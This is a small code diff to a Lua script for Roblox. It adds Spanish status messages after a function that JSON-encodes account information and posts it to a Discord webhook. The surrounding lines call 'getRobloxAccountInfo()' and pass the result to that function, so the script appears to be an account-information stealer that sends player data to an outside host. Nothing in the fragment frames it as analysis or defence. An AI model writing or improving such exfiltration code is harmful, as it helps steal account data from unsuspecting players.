@@ -74,6 +74,11 @@ local function sendToDiscord(accountInfo)
     local json = game:HttpService():JSONEncode(data)
 
     local response = game:HttpService():PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson)
+    if response then
+        print("Información enviada con éxito a Discord.")
+    else
+        print("Error al enviar la información a Discord.")
+    end
 end
 
 local accountInfo = getRobloxAccountInfo()
